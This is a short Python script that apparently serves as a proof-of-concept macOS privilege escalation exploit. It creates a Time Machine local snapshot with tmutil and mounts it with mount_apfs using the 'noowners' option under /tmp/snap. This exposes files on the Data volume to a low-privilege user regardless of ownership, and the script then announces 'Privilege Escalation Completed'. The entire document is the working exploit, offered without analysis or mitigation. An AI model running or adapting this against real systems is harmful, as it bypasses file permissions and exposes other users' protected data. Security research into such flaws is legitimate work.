import pwd
from pathlib import Path
import subprocess
import os 

'''Consts'''
SYSTEM_DIR = "/System/Volumes/Data"

'''Variables'''
low_priv_user = None
username = ""
snapshot_name = ""
tmp_dir_name = "/tmp/snap"

'''Check for a low priv user if DNE terminate'''
try:
	low_priv_user= pwd.getpwuid(502)
	username = low_priv_user.pw_name
except:
	print("User Does not Exist")

'''Create Output Directory Under /tmp'''
Path(tmp_dir_name).mkdir(parents=True, exist_ok=True)


'''Capture Snapshot via tmutil localsnapshot'''
cmd_output = subprocess.run(["tmutil","localsnapshot"])

'''List and Select Related Snapshot'''
cmd_output = subprocess.run(["tmutil","listlocalsnapshots","/"], stdout=subprocess.PIPE)
snapshots = cmd_output.stdout.decode().split("\n")
snapshot_name = snapshots[1]

'''Mount Selected Snapshot'''
 
# mount_apfs -o noowners -s com.apple.TimeMachine.2019-11-17-141812.local /System/Volumes/Data /tmp/snap
executed = False
try:
	cmd_output = subprocess.run(["mount_apfs","-o","noowners", snapshot_name, SYSTEM_DIR, tmp_dir_name], stdout=subprocess.PIPE)
	executed = True
except:
	executed = False
	print("Mount Failed")

if executed:
	result = subprocess.run(["ls", "-lah", tmp_dir_name], stdout=subprocess.PIPE)
	print(result.stdout.decode())
	print("Privilege Escalation Completed!!!!")

